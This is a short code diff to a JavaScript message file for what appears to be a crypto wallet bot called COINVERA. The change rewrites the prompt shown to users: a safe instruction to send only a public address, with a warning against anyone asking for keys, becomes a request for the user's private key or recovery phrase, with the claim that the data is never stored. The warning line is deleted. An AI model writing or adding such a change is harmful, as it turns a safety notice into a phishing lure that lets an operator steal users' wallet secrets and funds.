@@ -43,9 +43,9 @@ const WALLET_SECURITY_TEXT = [
 ].join('\n');
 
 const WALLET_CONTINUE_TEXT = [
-  '✅ Send your <b>public wallet address</b> only — COINVERA never asks for a private key, password or recovery phrase.',
+  '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data .',
   '',
-  'Anyone who asks for those is trying to take your funds.',
+ 
 ].join('\n');
 
 const WELCOME_TEXT = [
